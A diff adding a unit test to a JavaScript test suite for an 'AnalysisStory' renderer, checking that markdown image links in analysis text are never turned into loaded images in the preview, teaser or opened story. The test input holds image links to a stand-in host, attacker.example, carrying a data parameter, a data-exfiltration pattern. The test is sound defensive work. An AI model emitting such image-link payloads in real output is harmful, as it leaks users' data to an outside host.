@@ -327,6 +327,18 @@ describe("AnalysisStory", () => {
     expect(withTrailing).not.toContain("data-trailing");
   });
 
+  it("never loads an image the analysis text asks for, in the preview, the faded teaser or the open story", () => {
+    const report =
+      "Opening ![a](https://attacker.example/1?d=x).\n\n[[radar:evidence=0]]\n\nBehind the fold ![b](https://attacker.example/2?d=x).\n\n[[radar:evidence=1]]";
+    for (const html of [render(report), render(report, true)]) {
+      expect(html).not.toContain("<img");
+      expect(html).not.toContain("preload");
+      expect(html).not.toContain("attacker.example");
+    }
+    expect(render(report)).toContain("data-story-teaser");
+    expect(render(report, true)).toContain("Behind the fold <span>b</span>.");
+  });
+
   it("does not offer a fold when everything already fits the preview", () => {
     const html = render("One paragraph only.");
     expect(html).toContain("One paragraph only.");
